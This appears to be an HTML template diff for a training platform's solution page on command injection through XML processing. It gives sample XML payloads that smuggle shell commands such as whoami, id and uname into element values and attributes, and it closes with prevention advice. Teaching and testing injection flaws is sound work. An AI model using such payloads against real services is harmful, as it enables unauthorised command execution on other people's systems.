@@ -1,0 +1,75 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: Command Injection in XML Processing - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">Solution: Command Injection in XML Processing</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <i class="bi bi-info-circle-fill me-2"></i>
+                    <strong>Challenge:</strong> Exploit command injection through XML processing in a document conversion service.
+                </div>
+
+                <h3 class="mt-4">Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates command injection in an XML document processing service. The system processes XML documents and may execute system commands based on XML content without proper validation.
+                </p>
+
+                <h3 class="mt-4">Solution Steps</h3>
+                <ol>
+                    <li>
+                        <p><strong>Analyze the XML structure:</strong> The document processor accepts XML with various elements.</p>
+                    </li>
+                    <li>
+                        <p><strong>Inject commands in XML values:</strong> Try injecting commands in XML element values.</p>
+                        <pre class="bg-light p-3 rounded"><code>&lt;document&gt;&lt;title&gt;Report; whoami&lt;/title&gt;&lt;/document&gt;</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Test different XML elements:</strong> Try injection in multiple XML elements.</p>
+                        <pre class="bg-light p-3 rounded"><code>&lt;document&gt;&lt;author&gt;User && id&lt;/author&gt;&lt;/document&gt;</code></pre>
+                    </li>
+                    <li>
+                        <p><strong>Use XML attributes:</strong> Try injecting in XML attributes.</p>
+                        <pre class="bg-light p-3 rounded"><code>&lt;document type="report; uname"&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/document&gt;</code></pre>
+                    </li>
+                </ol>
+
+                <h3 class="mt-4">Alternative Payloads</h3>
+                <ul>
+                    <li><code>&lt;document&gt;&lt;title&gt;Report; whoami&lt;/title&gt;&lt;/document&gt;</code></li>
+                    <li><code>&lt;document&gt;&lt;author&gt;User && id&lt;/author&gt;&lt;/document&gt;</code></li>
+                    <li><code>&lt;document type="report | whoami"&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/document&gt;</code></li>
+                    <li><code>&lt;document&gt;&lt;content&gt;$(whoami)&lt;/content&gt;&lt;/document&gt;</code></li>
+                </ul>
+
+                <h3 class="mt-4">XML Processing Context</h3>
+                <p>This vulnerability is common in:</p>
+                <ul>
+                    <li>Document conversion services</li>
+                    <li>XML-based APIs</li>
+                    <li>Configuration management systems</li>
+                    <li>Data transformation pipelines</li>
+                </ul>
+
+                <h3 class="mt-4">Prevention</h3>
+                <ol>
+                    <li><strong>XML Schema Validation:</strong> Validate XML structure and content</li>
+                    <li><strong>Content Sanitization:</strong> Sanitize all XML element values</li>
+                    <li><strong>Safe XML Parsing:</strong> Use secure XML parsing libraries</li>
+                    <li><strong>Input Filtering:</strong> Filter dangerous characters and patterns</li>
+                </ol>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('cmdi_level10') }}" class="btn btn-outline-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end"><i class="bi bi-list me-2"></i>All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
